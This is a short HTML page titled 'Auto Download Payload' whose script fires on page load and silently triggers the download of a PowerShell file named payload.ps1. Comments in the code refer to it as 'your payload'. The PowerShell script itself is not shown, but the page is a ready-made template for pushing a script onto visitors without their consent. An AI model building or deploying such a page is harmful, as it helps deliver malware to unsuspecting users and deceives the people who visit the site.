<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Auto Download Payload</title>
</head>
<body>
  <h1>Your download will start automatically.</h1>

  <script>
    window.onload = function() {
      var link = document.createElement('a');
      link.href = '/files/payload.ps1';  // The path to your payload
      link.download = 'payload.ps1';     // This will suggest the filename when downloading
      link.click();                      // Trigger the download
    };
  </script>
</body>
</html>
